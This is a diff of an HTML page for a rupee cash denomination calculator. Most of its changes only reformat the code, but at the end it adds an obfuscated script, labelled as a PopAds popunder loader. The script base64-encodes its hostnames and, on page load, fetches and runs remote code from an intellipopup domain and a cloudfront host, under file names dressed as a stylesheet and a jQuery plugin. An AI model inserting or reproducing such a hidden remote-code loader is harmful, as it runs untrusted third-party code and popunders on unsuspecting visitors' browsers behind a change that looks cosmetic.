@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -6,6 +7,7 @@
 <meta name="theme-color" content="#101827">
 <meta name="description" content="Free Indian Cash Denomination Calculator">
 <title>Denomination Calculator | All Console Games</title>
+
 <style>
 *{box-sizing:border-box}
 body{margin:0;background:#0b1120;color:#f4f7ff;font-family:Arial,sans-serif}
@@ -48,29 +50,41 @@ header a,.actions,#historyCard,#paymentCard,footer{display:none!important}
 }
 </style>
 </head>
+
 <body>
 <header>
 <a href="index.html">← All Console Games Home</a>
 <h1>₹ Denomination Calculator</h1>
 <p>Count cash easily · Free · Mobile friendly</p>
 </header>
+
 <main>
 <section class="card">
 <span class="label">GRAND TOTAL</span>
 <div class="total" id="grandTotal">₹0</div>
 <div class="muted" id="words">Zero Rupees Only</div>
 <div class="stats">
-<div class="stat"><span class="label">Total Notes & Coins</span><strong id="totalQty">0</strong></div>
-<div class="stat"><span class="label">Denominations Used</span><strong id="usedCount">0 / 9</strong></div>
+<div class="stat">
+<span class="label">Total Notes &amp; Coins</span>
+<strong id="totalQty">0</strong>
+</div>
+<div class="stat">
+<span class="label">Denominations Used</span>
+<strong id="usedCount">0 / 9</strong>
+</div>
 </div>
 </section>
 
 <section class="card">
 <h2>Cash Details</h2>
 <table>
-<thead><tr><th>Denomination</th><th>Quantity</th><th>Amount</th></tr></thead>
+<thead>
+<tr><th>Denomination</th><th>Quantity</th><th>Amount</th></tr>
+</thead>
 <tbody id="cashRows"></tbody>
-<tfoot><tr><td colspan="2"><b>Total</b></td><td class="amount" id="tableTotal">₹0</td></tr></tfoot>
+<tfoot>
+<tr><td colspan="2"><b>Total</b></td><td class="amount" id="tableTotal">₹0</td></tr>
+</tfoot>
 </table>
 <div class="actions">
 <button class="secondary" id="clearBtn">Clear</button>
@@ -98,146 +112,229 @@ header a,.actions,#historyCard,#paymentCard,footer{display:none!important}
 <section class="card" id="historyCard">
 <h2>Recent Records</h2>
 <div id="history"></div>
-<div class="actions"><button class="secondary" id="deleteHistoryBtn">Delete History</button></div>
+<div class="actions">
+<button class="secondary" id="deleteHistoryBtn">Delete History</button>
+</div>
 </section>
 </main>
+
 <footer>© <span id="year"></span> All Console Games</footer>
 
 <script>
 "use strict";
+
 const denominations=[500,200,100,50,20,10,5,2,1];
 const $=id=>document.getElementById(id);
 const fmt=n=>new Intl.NumberFormat("en-IN",{maximumFractionDigits:0}).format(n);
 const money=n=>"₹"+fmt(n);
 let quantities=Array(9).fill(0);
 let history=[];
+
 try{
-const data=JSON.parse(localStorage.getItem("acg_denom_history")||"[]");
-if(Array.isArray(data))history=data.slice(0,20);
+  const data=JSON.parse(localStorage.getItem("acg_denom_history")||"[]");
+  if(Array.isArray(data)) history=data.slice(0,20);
 }catch(e){history=[];}
 
 function words(n){
-if(!Number.isSafeInteger(n)||n<0)return "Amount too large";
-if(n===0)return "Zero Rupees Only";
-const one=["","One","Two","Three","Four","Five","Six","Seven","Eight","Nine","Ten","Eleven","Twelve","Thirteen","Fourteen","Fifteen","Sixteen","Seventeen","Eighteen","Nineteen"];
-const ten=["","","Twenty","Thirty","Forty","Fifty","Sixty","Seventy","Eighty","Ninety"];
-function part(x){
-let s="";
-if(x>=100){s+=one[Math.floor(x/100)]+" Hundred";x%=100;if(x)s+=" ";}
-if(x>=20){s+=ten[Math.floor(x/10)];x%=10;if(x)s+=" "+one[x];}
-else if(x)s+=one[x];
-return s;
-}
-let result="";
-[[10000000,"Crore"],[100000,"Lakh"],[1000,"Thousand"],[1,""]].forEach(([v,label])=>{
-let q=Math.floor(n/v);
-if(q){result+=(result?" ":"")+part(q)+(label?" "+label:"");n%=v;}
-});
-return result+" Rupees Only";
+  if(!Number.isSafeInteger(n)||n<0)return "Amount too large";
+  if(n===0)return "Zero Rupees Only";
+
+  const one=["","One","Two","Three","Four","Five","Six","Seven","Eight","Nine","Ten","Eleven","Twelve","Thirteen","Fourteen","Fifteen","Sixteen","Seventeen","Eighteen","Nineteen"];
+  const ten=["","","Twenty","Thirty","Forty","Fifty","Sixty","Seventy","Eighty","Ninety"];
+
+  function part(x){
+    let s="";
+    if(x>=100){
+      s+=one[Math.floor(x/100)]+" Hundred";
+      x%=100;
+      if(x)s+=" ";
+    }
+    if(x>=20){
+      s+=ten[Math.floor(x/10)];
+      x%=10;
+      if(x)s+=" "+one[x];
+    }else if(x)s+=one[x];
+    return s;
+  }
+
+  let result="";
+  [[10000000,"Crore"],[100000,"Lakh"],[1000,"Thousand"],[1,""]].forEach(([v,label])=>{
+    const q=Math.floor(n/v);
+    if(q){
+      result+=(result?" ":"")+part(q)+(label?" "+label:"");
+      n%=v;
+    }
+  });
+  return result+" Rupees Only";
 }
 
 function calculate(){
-let total=0,count=0,used=0;
-denominations.forEach((d,i)=>{
-let q=Number($("qty"+i).value);
-if(!Number.isSafeInteger(q)||q<0)q=0;
-quantities[i]=q;
-const amount=d*q;
-total+=amount;count+=q;if(q>0)used++;
-$("amount"+i).textContent=money(amount);
-});
-$("grandTotal").textContent=money(total);
-$("tableTotal").textContent=money(total);
-$("words").textContent=words(total);
-$("totalQty").textContent=fmt(count);
-$("usedCount").textContent=used+" / 9";
+  let total=0,count=0,used=0;
 
-const input=$("required").value.trim();
-const required=Number(input);
-let msg="Enter the required amount to compare.";
-if(input!==""&&Number.isSafeInteger(required)&&required>=0){
-if(total===required)msg="✓ MATCHED — Exact amount received.";
-else if(total>required)msg="EXCESS — "+money(total-required)+" extra received.";
-else msg="SHORTAGE — "+money(required-total)+" still required.";
-}
-$("paymentStatus").textContent=msg;
-return {total,count};
+  denominations.forEach((d,i)=>{
+    let q=Number($("qty"+i).value);
+    if(!Number.isSafeInteger(q)||q<0)q=0;
+    quantities[i]=q;
+
+    const amount=d*q;
+    total+=amount;
+    count+=q;
+    if(q>0)used++;
+
+    $("amount"+i).textContent=money(amount);
+  });
+
+  $("grandTotal").textContent=money(total);
+  $("tableTotal").textContent=money(total);
+  $("words").textContent=words(total);
+  $("totalQty").textContent=fmt(count);
+  $("usedCount").textContent=used+" / 9";
+
+  const input=$("required").value.trim();
+  const required=Number(input);
+  let msg="Enter the required amount to compare.";
+
+  if(input!==""&&Number.isSafeInteger(required)&&required>=0){
+    if(total===required)msg="MATCHED — Exact amount received.";
+    else if(total>required)msg="EXCESS — "+money(total-required)+" extra received.";
+    else msg="SHORTAGE — "+money(required-total)+" still required.";
+  }
+
+  $("paymentStatus").textContent=msg;
+  return {total,count};
 }
 
 function renderRows(){
-$("cashRows").innerHTML=denominations.map((d,i)=>`
-<tr>
-<td><b>${money(d)}</b><span class="type">${i<6?"Note":"Coin"}</span></td>
-<td><input class="qty" id="qty${i}" type="number" min="0" step="1" inputmode="numeric" value="0" aria-label="${d} rupee quantity"></td>
-<td class="amount" id="amount${i}">₹0</td>
-</tr>`).join("");
-denominations.forEach((d,i)=>$("qty"+i).addEventListener("input",calculate));
+  $("cashRows").innerHTML=denominations.map((d,i)=>`
+    <tr>
+      <td><b>${money(d)}</b><span class="type">${i<6?"Note":"Coin"}</span></td>
+      <td><input class="qty" id="qty${i}" type="number" min="0" step="1" inputmode="numeric" value="0" aria-label="${d} rupee quantity"></td>
+      <td class="amount" id="amount${i}">₹0</td>
+    </tr>
+  `).join("");
+
+  denominations.forEach((d,i)=>{
+    $("qty"+i).addEventListener("input",calculate);
+  });
 }
 
 function escapeHTML(s){
-return String(s).replace(/[&<>"']/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));
+  return String(s).replace(/[&<>"']/g,c=>({
+    "&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"
+  }[c]));
 }
+
 function persist(){
-try{localStorage.setItem("acg_denom_history",JSON.stringify(history));return true;}
-catch(e){alert("Unable to save. Browser storage may be disabled.");return false;}
+  try{
+    localStorage.setItem("acg_denom_history",JSON.stringify(history));
+    return true;
+  }catch(e){
+    alert("Unable to save. Browser storage may be disabled.");
+    return false;
+  }
 }
+
 function renderHistory(){
-if(!history.length){$("history").innerHTML='<p class="muted">No saved records yet.</p>';return;}
-$("history").innerHTML=history.map((r,i)=>`
-<div class="history-item">
-<b>${escapeHTML(r.name||"Cash Record")}</b>
-<div>Total: ${money(r.total)} · Quantity: ${fmt(r.count)}</div>
-<small>${escapeHTML(r.date)}</small>
-<button class="secondary" data-load="${i}">Load</button>
-</div>`).join("");
-$("history").querySelectorAll("[data-load]").forEach(btn=>btn.addEventListener("click",()=>{
-const r=history[Number(btn.dataset.load)];
-if(!r)return;
-denominations.forEach((d,i)=>$("qty"+i).value=r.quantities[i]||0);
-$("required").value=r.required==null?"":r.required;
-$("recordName").value=r.name||"";
-calculate();
-window.scrollTo({top:0,behavior:"smooth"});
-}));
+  if(!history.length){
+    $("history").innerHTML='<p class="muted">No saved records yet.</p>';
+    return;
+  }
+
+  $("history").innerHTML=history.map((r,i)=>`
+    <div class="history-item">
+      <b>${escapeHTML(r.name||"Cash Record")}</b>
+      <div>Total: ${money(r.total)} · Quantity: ${fmt(r.count)}</div>
+      <small>${escapeHTML(r.date)}</small>
+      <button class="secondary" data-load="${i}">Load</button>
+    </div>
+  `).join("");
+
+  $("history").querySelectorAll("[data-load]").forEach(btn=>{
+    btn.addEventListener("click",()=>{
+      const r=history[Number(btn.dataset.load)];
+      if(!r)return;
+
+      denominations.forEach((d,i)=>{
+        $("qty"+i).value=r.quantities[i]||0;
+      });
+
+      $("required").value=r.required==null?"":r.required;
+      $("recordName").value=r.name||"";
+      calculate();
+      window.scrollTo({top:0,behavior:"smooth"});
+    });
+  });
 }
 
 $("clearBtn").addEventListener("click",()=>{
-denominations.forEach((d,i)=>$("qty"+i).value=0);calculate();
+  denominations.forEach((d,i)=>$("qty"+i).value=0);
+  calculate();
 });
+
 $("resetBtn").addEventListener("click",()=>{
-if(!confirm("Reset all quantities and payment details?"))return;
-denominations.forEach((d,i)=>$("qty"+i).value=0);
-$("required").value="";$("recordName").value="";calculate();
+  if(!confirm("Reset all quantities and payment details?"))return;
+  denominations.forEach((d,i)=>$("qty"+i).value=0);
+  $("required").value="";
+  $("recordName").value="";
+  calculate();
 });
+
 $("required").addEventListener("input",calculate);
 $("printBtn").addEventListener("click",()=>window.print());
+
 $("saveBtn").addEventListener("click",()=>{
-const r=calculate();
-const text=$("required").value.trim();
-const required=text===""?null:Number(text);
-if(!Number.isSafeInteger(r.total)||!Number.isSafeInteger(r.count)){
-alert("Amount is too large.");return;
-}
-if(required!==null&&(!Number.isSafeInteger(required)||required<0)){
-alert("Enter a valid required amount.");return;
-}
-const old=history;
-history=[{
-name:$("recordName").value.trim(),
-date:new Date().toLocaleString("en-IN"),
-total:r.total,count:r.count,required,
-quantities:[...quantities]
-},...history].slice(0,20);
-if(persist()){renderHistory();alert("Cash record saved!");}
-else history=old;
+  const r=calculate();
+  const text=$("required").value.trim();
+  const required=text===""?null:Number(text);
+
+  if(!Number.isSafeInteger(r.total)||!Number.isSafeInteger(r.count)){
+    alert("Amount is too large.");
+    return;
+  }
+
+  if(required!==null&&(!Number.isSafeInteger(required)||required<0)){
+    alert("Enter a valid required amount.");
+    return;
+  }
+
+  const old=history;
+  history=[{
+    name:$("recordName").value.trim(),
+    date:new Date().toLocaleString("en-IN"),
+    total:r.total,
+    count:r.count,
+    required,
+    quantities:[...quantities]
+  },...history].slice(0,20);
+
+  if(persist()){
+    renderHistory();
+    alert("Cash record saved!");
+  }else{
+    history=old;
+  }
 });
+
 $("deleteHistoryBtn").addEventListener("click",()=>{
-if(!confirm("Delete all saved records?"))return;
-const old=history;history=[];
-if(persist())renderHistory();else history=old;
+  if(!confirm("Delete all saved records?"))return;
+  const old=history;
+  history=[];
+  if(persist())renderHistory();
+  else history=old;
 });
+
 $("year").textContent=new Date().getFullYear();
-renderRows();renderHistory();calculate();
+renderRows();
+renderHistory();
+calculate();
 </script>
+
+<!-- PopAds script: supplied by the site owner -->
+<script type="text/javascript" data-cfasync="false">
+/*<![CDATA[/* */
+(function(){var e=window,n="c68049e10a6d50c79477526e41f37353",l=[["siteId",645-312+954*914-775+4449751],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],i=["d3d3LmludGVsbGlwb3B1cC5jb20vdGZsb3cubWluLmNzcw==","ZDNtcjd5MTU0ZDJxZzUuY2xvdWRmcm9udC5uZXQvQU0vaGpxdWVyeS50eXBlYWhlYWQubWluLmpz"],s=-1,o,t,r=function(){clearTimeout(t);s++;if(i[s]&&!(1818527729000<(new Date).getTime()&&1<s)){o=e.document.createElement("script");o.type="text/javascript";o.async=!0;var u=e.document.getElementsByTagName("script")[0];o.src="https://"+atob(i[s]);o.crossOrigin="anonymous";o.onerror=r;o.onload=function(){clearTimeout(t);e[n.slice(0,16)+n.slice(0,16)]||r()};t=setTimeout(r,5E3);u.parentNode.insertBefore(o,u)}};if(!e[n]){try{Object.freeze(e[n]=l)}catch(e){}r()}})();
+/*]]>/* */
+</script>
+
 </body>
 </html>
